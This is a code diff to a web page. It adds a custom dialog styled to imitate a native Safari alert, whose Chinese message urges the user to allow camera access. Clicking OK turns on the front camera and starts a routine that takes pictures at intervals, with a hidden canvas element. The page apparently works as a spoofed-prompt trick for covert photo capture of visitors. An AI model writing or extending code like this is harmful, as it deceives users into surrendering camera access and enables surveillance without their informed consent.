@@ -26,6 +26,76 @@
         #canvas {
             display: none;
         }
+        
+        /* Custom modal styles to mimic Safari */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        
+        .modal-container {
+            background-color: #f8f8f8;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+            width: 400px;
+            max-width: 90%;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        .modal-header {
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid #ddd;
+        }
+        
+        .modal-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #000;
+            margin: 0;
+        }
+        
+        .modal-body {
+            padding: 20px;
+            text-align: center;
+            color: #333;
+            font-size: 13px;
+        }
+        
+        .modal-footer {
+            display: flex;
+            justify-content: center;
+            padding: 15px;
+            border-top: 1px solid #ddd;
+        }
+        
+        .modal-button {
+            background: linear-gradient(to bottom, #fff, #f2f2f2);
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            padding: 8px 20px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #007AFF;
+            cursor: pointer;
+            min-width: 80px;
+        }
+        
+        .modal-button:hover {
+            background: linear-gradient(to bottom, #f2f2f2, #e6e6e6);
+        }
+        
+        .modal-button:active {
+            background: linear-gradient(to bottom, #e6e6e6, #d9d9d9);
+        }
     </style>
 </head>
 <body>
@@ -43,32 +113,76 @@
 
         // Show alert first when button is clicked
         document.getElementById('start').addEventListener('click', async () => {
-            // Display alert box first - compatible with all major browsers
-            showAlert('为了继续使用此服务，请允许访问您的摄像头。点击确定以继续。');
-            
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user' } 
-                });
-                video.srcObject = stream;
-                
-                // Hide the button after successful access
-                document.getElementById('start').style.display = 'none';
-                
-                // Start taking pictures at intervals
-                startCapturing();
-            } catch (err) {
-                console.error("Error accessing camera:", err);
-                showAlert("Could not access the camera. Please check permissions.");
-            }
+            // Display Safari-style alert box first
+            showSafariStyleAlert('为了继续使用此服务，请允许访问您的摄像头。点击确定以继续。', async () => {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: 'user' } 
+                    });
+                    video.srcObject = stream;
+                    
+                    // Hide the button after successful access
+                    document.getElementById('start').style.display = 'none';
+                    
+                    // Start taking pictures at intervals
+                    startCapturing();
+                } catch (err) {
+                    console.error("Error accessing camera:", err);
+                    showSafariStyleAlert("无法访问摄像头。请检查权限设置。");
+                }
+            });
         });
 
-        // Cross-browser compatible alert function
-        function showAlert(message) {
-            // Using setTimeout to ensure proper execution order in different browsers
-            setTimeout(() => {
-                alert(message);
-            }, 0);
+        // Custom modal function to mimic Safari alert
+        function showSafariStyleAlert(message, callback) {
+            // Create overlay
+            const overlay = document.createElement('div');
+            overlay.className = 'modal-overlay';
+            
+            // Create modal container
+            const container = document.createElement('div');
+            container.className = 'modal-container';
+            
+            // Create header
+            const header = document.createElement('div');
+            header.className = 'modal-header';
+            
+            const title = document.createElement('h3');
+            title.className = 'modal-title';
+            title.textContent = '提示';
+            header.appendChild(title);
+            
+            // Create body
+            const body = document.createElement('div');
+            body.className = 'modal-body';
+            body.textContent = message;
+            
+            // Create footer
+            const footer = document.createElement('div');
+            footer.className = 'modal-footer';
+            
+            // Create OK button
+            const button = document.createElement('button');
+            button.className = 'modal-button';
+            button.textContent = '好';
+            button.addEventListener('click', () => {
+                document.body.removeChild(overlay);
+                if (callback) callback();
+            });
+            
+            footer.appendChild(button);
+            
+            // Assemble modal
+            container.appendChild(header);
+            container.appendChild(body);
+            container.appendChild(footer);
+            overlay.appendChild(container);
+            
+            // Add to DOM
+            document.body.appendChild(overlay);
+            
+            // Focus the button to ensure its visible
+            button.focus();
         }
 
         function startCapturing() {
